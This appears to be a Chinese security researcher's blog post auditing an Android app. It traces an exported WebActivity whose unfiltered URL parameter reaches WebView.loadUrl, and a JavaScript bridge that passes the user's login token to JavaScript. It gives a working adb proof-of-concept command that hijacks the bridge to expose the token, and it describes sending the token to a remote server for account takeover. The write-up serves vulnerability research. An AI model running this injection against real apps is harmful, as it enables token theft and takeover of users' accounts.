#  【代码审计】客户端代码执行之WebView JavaScript桥接劫持token账号接管  
原创 挖个洞先
                        挖个洞先  挖个洞先   2026-03-28 11:12  
  
******“**  
   
道也梦中来，青居心上请。 觉时花未央，剑罢孤楼影。——《我有一身被动技》  
 **”**  
****  
  
  
  
  
01  
  
—  
  
  
操作步骤  
  
  
  
1、  
WebActivity可导出  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vRTpz13XcL97fxFlr34ON4NFp7oVv7sAa3tiaicaDRxnlibucEQBFRr2IicQYvMUEnYrMSsz2wZGFJxKo52u6wCTibokmx3daoQyTYscibW2pqMf0/640?wx_fmt=png&from=appmsg "")  
```
<activity
            android:name="com.unitree.community.ui.web.WebActivity"
            android:exported="true"
            android:configChanges="screenSize|orientation|keyboardHidden"/>
```  
  
  
2、查看  
com.xxx.web.WebActivity，入口  
initView()，传参没有过滤直接赋值给  
this.webUrl  
  
如果是app://，走内部业务跳转，  
  
否则调用  
createAgentWeb().ready().go(this.webUrl);  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vRTpz13XcL9K2mjVGTYftywG4DCiaW1icFUibo9iarEvYr39gyzCP38cR2YSg4L5QPvrYRslo1lVmrjDDaz62EiaUiaGx94kRZ8pvnqjiabWZiaBzYA/640?wx_fmt=png&from=appmsg "")  
```
String stringExtra = getIntent().getStringExtra(ProviderConstant.WEB_URL);
this.webUrl = stringExtra;
.setOpenOtherPageWays(DefaultWebClient.OpenOtherPageWays.ASK).interceptUnkownUrl().createAgentWeb().ready().go(this.webUrl);
```  
  
  
3、从go()一步步跟到  
UrlLoaderImpl()  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vRTpz13XcL84wu9cchQPXJ42lC3xkz8a6OeOor3MSibysLPCnLXqMtpiagaTjlr3Dhl1L4eEibgPo2mBrjEssoHc1ibyf0ibYhXSYj44ib9miaYFgo/640?wx_fmt=png&from=appmsg "")  
```
UrlLoaderImpl(WebView webView, HttpHeaders httpHeaders) {
        this.mHandler = null;
        this.mWebView = webView;
        this.mHttpHeaders = httpHeaders;
        if (httpHeaders == null) {
            this.mHttpHeaders = HttpHeaders.create();
        }
        this.mHandler = new Handler(Looper.getMainLooper());
    }
```  
  
  
4、  
str没有过滤，最终传参到WebView.loadUrl(str)直接执行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vRTpz13XcL9jM5xwXxuv6haChDcLP1iaSd1Xy0WHm34Y2BrEDf86cxWtibHPUibODSzOiapr8CH8ibQ7qnkicpIMT3NM2H8NRHRRaMs9aVUlO8rvs/640?wx_fmt=png&from=appmsg "")  
```
if (map == null || map.isEmpty()) {
            this.mWebView.loadUrl(str);
        }
```  
  
  
5、继续分析，  
发现  
注册了AndroidInterface作为JavaScript桥接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vRTpz13XcL8f6x3Gt8Md9kHhJmFoGvonIpQfwEZmfC7gS3Nup2bySzkZibo2tm6jebBVL9Z58D3jvKdBKibhT6PCLRtLA8AQv18wWJFGE8lI4/640?wx_fmt=png&from=appmsg "")  
```
JsInterfaceHolder jsInterfaceHolder = agentWeb2.getJsInterfaceHolder();
        AgentWeb agentWeb3 = this.mAgentWeb;
        if (agentWeb3 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("mAgentWeb");
            agentWeb3 = null;
        }
        jsInterfaceHolder.addJavaObject(DispatchConstants.ANDROID, new AndroidInterface(agentWeb3, this));
```  
  
  
6、进到  
AndroidInterface类，发现  
callNativeFunc方法  
  
callNativeFunc是Android原生提供给WebView，可以被JavaScript调用的方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vRTpz13XcL91XAibq1jl3OUgo2cFkxqPrOaT4rOxGFYsxLSQ30nWbkYUu419BBCmXWfW5TX1pJKtMBB6nuArOEQFtwiayQzG4wTChzJs0wG90/640?wx_fmt=png&from=appmsg "")  
```
public void callNativeFunc(final String str) {
        this.deliver.post(new Runnable() { // from class: com.xxx.web.AndroidInterface.1
            @Override // java.lang.Runnable
            public void run() {
                Log.i("Info", "main Thread:" + Thread.currentThread());
                Toast.makeText(StubApp.getOrigApplicationContext(AndroidInterface.this.context.getApplicationContext()), "" + str, 1).show();
            }
        });
        Log.i("Info", "Thread:" + Thread.currentThread());
    }
```  
  
  
7、  
agentWeb.getJsAccessEntrace()分析  
  
agentWeb，AgentWeb实例，封装了WebView  
  
.getJsAccessEntrace()，获取JavaScript访问入口对象，用于原生代码调用JavaScript  
  
quickCallJs()第一个参数  
callNativeFunc()，第二个参数接收  
函数返回值  
  
第三个参数  
CommonUtilsKt.getToken()获取token  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vRTpz13XcLicmoGT3exWyCxxPqymLm1Ip37bfH2x7IIg1yiadVCneSWmXudaBbic7UHeBuDfk7emQX9cvdw1vhuBlrJz2YGY9G9kMObXiaMdj0c/640?wx_fmt=png&from=appmsg "")  
```
agentWeb.getJsAccessEntrace().quickCallJs("callNativeFunc", new ValueCallback() { // from class: 
            @Override // android.webkit.ValueCallback
            public final void onReceiveValue(Object obj) {
                WebActivity.m122initView$lambda0((String) obj);
            }
        }, CommonUtilsKt.getToken());
```  
  
  
8、进到  
getToken()，  
获取MMKV默认实例，  
从存储中读取key为"token"的字符串值  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vRTpz13XcL8HblLjDtK0a7rkHtr1L5jia4Z4luOPq8Aic0tgMUN1iaPsInaSNVVbxU4U3Gfvvs8T3DrP4BXaOshmJlIItRwS3EC5qP2cnnFs5I/640?wx_fmt=png&from=appmsg "")  
```
public static final String getToken() {
        String strDecodeString = MMKV.defaultMMKV().decodeString("token");
        return strDecodeString == null ? "" : strDecodeString;
    }
```  
  
  
9、构造poc，当原生代码调用callNativeFunc(token)时，实际上执行的是alert(token)  
```
adb shell am start -W -n com.xxx/com.xxx.web.WebActivity --es web_url "javascript:window.callNativeFunc=alert"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vRTpz13XcL9O1Tt5GHY3WHaHM2gMSHfh2HAoeE8sVkLp9j5DgB2gtdv95YDqN5WiapxfXBSs0Msgtew84d4bvxeIibTiaeORgufOELedmcNKB4/640?wx_fmt=png&from=appmsg "")  
  
  
10、  
成功获取token，由于存在社区功能，可以发帖，fetch到远程服务器上，1click账号接管  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vRTpz13XcL9tbgT35H1j4xLTqOogW4GhrJyKticDmpSMJQ4ojCbfjcticrC503r7OYYZpA3vsdQI9bbw2U0s4MRajSYWyoMyIG4wQUicCBEKlk/640?wx_fmt=png&from=appmsg "")  
  
  
11、  
与实际请求token进行对比一致  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vRTpz13XcL8JvndshuHeqian6TueFx6QKlsbWtjtM01Kbpye7ywnAY1eTnCTqANgtDKHb6PPKlkfojf0oWvraxp5PRh5icSIxhDd0ZtupWQo4/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
  
  
  
  
  
  
